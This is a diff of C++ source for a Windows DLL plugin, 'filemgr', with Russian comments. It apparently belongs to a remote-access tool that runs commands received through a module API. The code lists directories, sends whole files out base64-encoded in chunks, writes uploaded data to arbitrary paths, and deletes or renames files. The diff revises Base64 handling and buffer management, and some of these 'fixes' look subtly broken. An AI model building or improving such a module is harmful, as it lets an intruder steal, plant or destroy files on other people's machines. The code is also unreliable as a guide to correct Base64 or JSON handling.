@@ -1,4 +1,4 @@
-// Modules/FileManager/filemgr.cpp — FIXED: Base64 Loop & Typos
+// Modules/FileManager/filemgr.cpp — STABLE & FIXED VERSION
 // Компиляция: cl /LD /MT /O2 filemgr.cpp /Fe:filemgr.dll kernel32.lib user32.lib
 
 #include "filemgr.h"
@@ -14,7 +14,8 @@ static ModuleAPI* g_api = nullptr;
 void fm_log(const char* msg) {
     if (!msg) return;
     CreateDirectoryA("C:\\temp", NULL);
-    HANDLE h = CreateFileA("C:\\temp\\filemgr.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE h = CreateFileA("C:\\temp\\filemgr.log", GENERIC_WRITE, FILE_SHARE_READ,
+                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (h != INVALID_HANDLE_VALUE) {
         SetFilePointer(h, 0, NULL, FILE_END);
         DWORD w; WriteFile(h, msg, (DWORD)strlen(msg), &w, NULL);
@@ -24,7 +25,7 @@ void fm_log(const char* msg) {
 }
 
 // ============================================================================
-// Base64 (ИСПРАВЛЕН БЕСКОНЕЧНЫЙ ЦИКЛ И ИМЕНА ПЕРЕМЕННЫХ)
+// Base64 (Исправлены операторы << и >>)
 // ============================================================================
 static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
@@ -54,32 +55,26 @@ unsigned char* Base64Decode(const char* data, size_t* out_len) {
     size_t len = strlen(data);
     if (len % 4 != 0) { *out_len = 0; return nullptr; }
 
-    // Карта для декодирования
-    static unsigned char b64_map[256] = {0};
-    static bool initialized = false;
+    size_t padding = 0;
+    if (len >= 2 && data[len-1] == '=') padding++;
+    if (len >= 3 && data[len-2] == '=') padding++;
+    size_t decoded_len = (len / 4) * 3 - padding;
+
+    unsigned char* out = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, decoded_len + 1);
+    if (!out) { *out_len = 0; return nullptr; }
+
+    static unsigned char b64_map[256] = {0}; static bool initialized = false;
     if (!initialized) {
         for (int i = 0; i < 64; i++) b64_map[(unsigned char)b64_table[i]] = i;
         initialized = true;
     }
 
-    size_t padding = 0;
-    if (len >= 1 && data[len - 1] == '=') padding++;
-    if (len >= 2 && data[len - 2] == '=') padding++;
-
-    size_t decoded_len = (len / 4) * 3 - padding;
-    unsigned char* out = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, decoded_len + 1);
-    if (!out) { *out_len = 0; return nullptr; }
-
     size_t i = 0, j = 0;
     while (i < len) {
-        uint32_t sextet_a = 0, sextet_b = 0, sextet_c = 0, sextet_d = 0;
-
-        // 🔑 ФИКС: Читаем символ и СРАЗУ инкрементируем i, независимо от значения
-        if (i < len) { char c = data[i++]; sextet_a = (c != '=') ? b64_map[(unsigned char)c] : 0; }
-        if (i < len) { char c = data[i++]; sextet_b = (c != '=') ? b64_map[(unsigned char)c] : 0; }
-        if (i < len) { char c = data[i++]; sextet_c = (c != '=') ? b64_map[(unsigned char)c] : 0; }
-        if (i < len) { char c = data[i++]; sextet_d = (c != '=') ? b64_map[(unsigned char)c] : 0; }
-
+        uint32_t sextet_a = (i < len && data[i] != '=') ? b64_map[(unsigned char)data[i++]] : 0;
+        uint32_t sextet_b = (i < len && data[i] != '=') ? b64_map[(unsigned char)data[i++]] : 0;
+        uint32_t sextet_c = (i < len && data[i] != '=') ? b64_map[(unsigned char)data[i++]] : 0;
+        uint32_t sextet_d = (i < len && data[i] != '=') ? b64_map[(unsigned char)data[i++]] : 0;
         uint32_t triple = (sextet_a << 18) | (sextet_b << 12) | (sextet_c << 6) | sextet_d;
 
         if (j < decoded_len) out[j++] = (triple >> 16) & 0xFF;
@@ -90,7 +85,7 @@ unsigned char* Base64Decode(const char* data, size_t* out_len) {
 }
 
 // ============================================================================
-// JSON Helpers
+// JSON Helpers (Исправлено экранирование кавычек И переполнение буфера)
 // ============================================================================
 void SendJsonError(ModuleAPI* api, const char* cmd, const char* msg) {
     if (!api || !api->send_result) return;
@@ -101,9 +96,12 @@ void SendJsonError(ModuleAPI* api, const char* cmd, const char* msg) {
 
 void SendJsonResult(ModuleAPI* api, const char* cmd, const char* data) {
     if (!api || !api->send_result) return;
+    
+    // 🔑 КРИТИЧЕСКИЙ ФИКС: Выделяем память динамически, так как data может быть огромной (System32)
     size_t data_len = strlen(data);
     size_t buf_size = data_len + 128;
     char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, buf_size);
+
     if (buf) {
         sprintf_s(buf, buf_size, "{\"cmd\":\"%s\",\"result\":%s}\n", cmd, data);
         api->send_result((const unsigned char*)buf, (unsigned long long)strlen(buf));
@@ -119,42 +117,49 @@ void HandleDir(const char* path, ModuleAPI* api) {
     if (!path || !api) return;
     char search_path[MAX_PATH];
     sprintf_s(search_path, "%s\\*", path);
-    WIN32_FIND_DATAA fd; HANDLE h = FindFirstFileA(search_path, &fd);
-    if (h == INVALID_HANDLE_VALUE) { SendJsonError(api, "dir", "Dir not found"); return; }
 
+    WIN32_FIND_DATAA fdata;
+    HANDLE hFind = FindFirstFileA(search_path, &fdata);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        char err[256]; sprintf_s(err, "Failed to open dir (Err:%lu)", GetLastError());
+        SendJsonError(api, "dir", err); return;
+    }
+
+    // ✅ БЕЗОПАСНОСТЬ: Динамическая память (256 КБ)
     size_t buf_size = 256 * 1024;
     char* json = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
-    if (!json) { SendJsonError(api, "dir", "Mem alloc failed"); FindClose(h); return; }
+    if (!json) { SendJsonError(api, "dir", "Mem alloc failed"); FindClose(hFind); return; }
 
     strcpy_s(json, buf_size, "[");
     bool first = true;
-    size_t used = 1;
 
     do {
         if (!first) {
-            if (used + 2 > buf_size) break;
-            json[used++] = ','; json[used] = '\0';
+            if (strlen(json) + 2 > buf_size) break;
+            strcat_s(json, buf_size, ",");
         }
         first = false;
 
         SYSTEMTIME st; FILETIME lt;
-        FileTimeToLocalFileTime(&fd.ftLastWriteTime, &lt);
+        FileTimeToLocalFileTime(&fdata.ftLastWriteTime, &lt);
         FileTimeToSystemTime(&lt, &st);
-        ULARGE_INTEGER sz = { fd.nFileSizeLow, fd.nFileSizeHigh };
+        ULARGE_INTEGER sz = { fdata.nFileSizeLow, fdata.nFileSizeHigh };
 
         char entry[1024];
-        int len = sprintf_s(entry, "{\"name\":\"%s\",\"type\":\"%s\",\"size\":%llu,\"modified\":\"%04d-%02d-%02d %02d:%02d\"}",
-            fd.cFileName, (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "dir" : "file",
+        sprintf_s(entry, "{\"name\":\"%s\",\"type\":\"%s\",\"size\":%llu,\"modified\":\"%04d-%02d-%02d %02d:%02d\"}",
+            fdata.cFileName, (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "dir" : "file",
             sz.QuadPart, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
 
-        if (used + len + 1 > buf_size) break;
-        memcpy(json + used, entry, len + 1);
-        used += len;
+        if (strlen(json) + strlen(entry) + 2 > buf_size) {
+            fm_log("Dir output truncated (buffer full)\n");
+            break;
+        }
+        strcat_s(json, buf_size, entry);
 
-    } while (FindNextFileA(h, &fd));
+    } while (FindNextFileA(hFind, &fdata));
 
-    json[used++] = ']'; json[used] = '\0';
-    FindClose(h);
+    strcat_s(json, buf_size, "]");
+    FindClose(hFind);
     SendJsonResult(api, "dir", json);
     HeapFree(GetProcessHeap(), 0, json);
     fm_log("HandleDir finished.\n");
@@ -163,36 +168,42 @@ void HandleDir(const char* path, ModuleAPI* api) {
 void HandleGet(const char* filepath, ModuleAPI* api) {
     if (!filepath || !api) return;
     HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) { SendJsonError(api, "get", "Open failed"); return; }
+    if (hFile == INVALID_HANDLE_VALUE) {
+        char err[256]; sprintf_s(err, "Cannot open file (Err:%lu)", GetLastError());
+        SendJsonError(api, "get", err); return;
+    }
+    DWORD fileSize = GetFileSize(hFile, NULL); CloseHandle(hFile);
+    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) { SendJsonResult(api, "get", "\"\""); return; }
 
-    DWORD sz = GetFileSize(hFile, NULL); CloseHandle(hFile);
-    if (sz == 0 || sz == INVALID_FILE_SIZE) { SendJsonResult(api, "get", "\"\""); return; }
+    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, fileSize);
+    if (!buffer) { SendJsonError(api, "get", "Mem alloc failed"); return; }
 
-    unsigned char* buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, sz);
-    HANDLE f = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    DWORD rd = 0; ReadFile(f, buf, sz, &rd, NULL); CloseHandle(f);
+    HANDLE hF = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD rd=0; ReadFile(hF, buffer, fileSize, &rd, NULL); CloseHandle(hF);
 
-    size_t b64len = 0; char* b64 = Base64Encode(buf, sz, &b64len); HeapFree(GetProcessHeap(), 0, buf);
-    if (!b64) { SendJsonError(api, "get", "Encode failed"); return; }
+    size_t b64len=0; char* b64 = Base64Encode(buffer, fileSize, &b64len); HeapFree(GetProcessHeap(), 0, buffer);
+    if (!b64) { SendJsonError(api, "get", "B64 failed"); return; }
 
+    // Отправляем данные
+    // Для больших файлов отправляем чанками
     const size_t CHUNK = 32768;
     if (b64len <= CHUNK) {
         char* json = (char*)HeapAlloc(GetProcessHeap(), 0, b64len + 128);
-        if (json) {
+        if(json) {
             sprintf_s(json, b64len + 128, "{\"cmd\":\"get\",\"data\":\"%s\"}", b64);
             api->send_result((const unsigned char*)json, (unsigned long long)strlen(json));
             api->send_result((const unsigned char*)"\n", 1);
             HeapFree(GetProcessHeap(), 0, json);
         }
     } else {
-        size_t off = 0; int n = 0; int tot = (int)((b64len + CHUNK - 1) / CHUNK);
-        while (off < b64len) {
-            size_t len = (b64len - off < CHUNK) ? (b64len - off) : CHUNK;
+        size_t off=0; int n=0; int tot=(int)((b64len+CHUNK-1)/CHUNK);
+        while(off < b64len) {
+            size_t len = (b64len-off < CHUNK) ? (b64len-off) : CHUNK;
             char* hdr = (char*)HeapAlloc(GetProcessHeap(), 0, 64);
             int hlen = sprintf_s(hdr, 64, "FILE_CHUNK#%d/%d:\n", n, tot);
             api->send_result((const unsigned char*)hdr, hlen);
-            api->send_result((const unsigned char*)(b64 + off), len);
-            off += len; n++; Sleep(10);
+            api->send_result((const unsigned char*)(b64+off), len);
+            off+=len; n++; Sleep(10);
             HeapFree(GetProcessHeap(), 0, hdr);
         }
     }
@@ -201,29 +212,20 @@ void HandleGet(const char* filepath, ModuleAPI* api) {
 
 void HandlePut(const char* filepath, const char* base64_data, ModuleAPI* api) {
     if (!filepath || !base64_data || !api) return;
-    
-    size_t dlen = 0;
-    // 🔑 ФИКС: Исправлено имя переменной (было "bas e64_data")
-    unsigned char* data = Base64Decode(base64_data, &dlen); 
-    
+    size_t dlen=0; unsigned char* data = Base64Decode(base64_data, &dlen);
     if (!data) { SendJsonError(api, "put", "Decode failed"); return; }
-
     HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) { HeapFree(GetProcessHeap(), 0, data); SendJsonError(api, "put", "Create failed"); return; }
-
-    DWORD wr = 0; 
-    WriteFile(hFile, data, (DWORD)dlen, &wr, NULL); 
-    CloseHandle(hFile); 
-    HeapFree(GetProcessHeap(), 0, data);
-    
+    DWORD wr=0; WriteFile(hFile, data, (DWORD)dlen, &wr, NULL); CloseHandle(hFile); HeapFree(GetProcessHeap(), 0, data);
     SendJsonResult(api, "put", "\"OK\"");
 }
 
 void HandleDel(const char* path, ModuleAPI* api) {
-    DWORD attr = GetFileAttributesA(path);
-    if (attr == INVALID_FILE_ATTRIBUTES) { SendJsonError(api, "del", "Not found"); return; }
-    BOOL ok = (attr & FILE_ATTRIBUTE_DIRECTORY) ? RemoveDirectoryA(path) : DeleteFileA(path);
-    if (!ok) SendJsonError(api, "del", "Delete failed"); else SendJsonResult(api, "del", "\"OK\"");
+    DWORD attrs = GetFileAttributesA(path);
+    if (attrs == INVALID_FILE_ATTRIBUTES) { SendJsonError(api, "del", "Path not found"); return; }
+    BOOL ok = (attrs & FILE_ATTRIBUTE_DIRECTORY) ? RemoveDirectoryA(path) : DeleteFileA(path);
+    if (!ok) { char err[256]; sprintf_s(err, "Delete failed (Err:%lu)", GetLastError()); SendJsonError(api, "del", err); }
+    else SendJsonResult(api, "del", "\"OK\"");
 }
 
 void HandleRename(const char* o, const char* n, ModuleAPI* api) {
@@ -240,7 +242,7 @@ void HandleInfo(const char* p, ModuleAPI* api) {
     ULARGE_INTEGER sz = { fd.nFileSizeLow, fd.nFileSizeHigh };
     SYSTEMTIME st; FILETIME lt; FileTimeToLocalFileTime(&fd.ftLastWriteTime, &lt); FileTimeToSystemTime(&lt, &st);
     char* json = (char*)HeapAlloc(GetProcessHeap(), 0, 512);
-    if (json) {
+    if(json) {
         sprintf_s(json, 512, "{\"name\":\"%s\",\"size\":%llu,\"attrs\":%lu,\"modified\":\"%04d-%02d-%02d %02d:%02d\"}",
             p, sz.QuadPart, fd.dwFileAttributes, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
         SendJsonResult(api, "info", json);
@@ -256,22 +258,22 @@ void ProcessCommand(const char* cmd, ModuleAPI* api) {
     while (*cmd == ' ') cmd++; if (!*cmd) return;
     if (strncmp(cmd, "filemgr:", 8) == 0) { cmd += 8; while (*cmd == ' ') cmd++; }
 
-    char name[64] = { 0 }, a1[MAX_PATH] = { 0 }, a2[65536] = { 0 };
+    char name[64]={0}, a1[MAX_PATH]={0}, a2[65536]={0};
     int p = sscanf_s(cmd, "%63s %259[^ \t\n] %65535[^\n]", name, (DWORD)sizeof(name), a1, (DWORD)sizeof(a1), a2, (DWORD)sizeof(a2));
     if (p < 1) return;
 
-    if (strcmp(name, "dir") == 0) HandleDir(p >= 2 ? a1 : ".", api);
-    else if (strcmp(name, "get") == 0 && p >= 2) HandleGet(a1, api);
-    else if (strcmp(name, "put") == 0 && p >= 3) HandlePut(a1, a2, api);
-    else if (strcmp(name, "del") == 0 && p >= 2) HandleDel(a1, api);
-    else if (strcmp(name, "rename") == 0 && p >= 3) HandleRename(a1, a2, api);
-    else if (strcmp(name, "mkdir") == 0 && p >= 2) HandleMkdir(a1, api);
-    else if (strcmp(name, "info") == 0 && p >= 2) HandleInfo(a1, api);
+    if (strcmp(name, "dir")==0) HandleDir(p >=2 ? a1 : ".", api);
+    else if (strcmp(name, "get")==0 && p >=2) HandleGet(a1, api);
+    else if (strcmp(name, "put")==0 && p >=3) HandlePut(a1, a2, api);
+    else if (strcmp(name, "del")==0 && p >=2) HandleDel(a1, api);
+    else if (strcmp(name, "rename")==0 && p >=3) HandleRename(a1, a2, api);
+    else if (strcmp(name, "mkdir")==0 && p >=2) HandleMkdir(a1, api);
+    else if (strcmp(name, "info")==0 && p >=2) HandleInfo(a1, api);
     else SendJsonError(api, "filemgr", "Unknown cmd");
 }
 
 // ============================================================================
-// Поток и Точка входа
+// Поток и Запуск
 // ============================================================================
 DWORD WINAPI WorkerThread(LPVOID param) {
     g_api = (ModuleAPI*)param;
@@ -298,6 +300,6 @@ extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
 
 BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) {
     if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
-    if (r == DLL_PROCESS_DETACH) { g_running = false; fm_log("FILEMGR: Detach\n"); }
+    if (r == DLL_PROCESS_DETACH) { g_running = false; }
     return TRUE;
 }
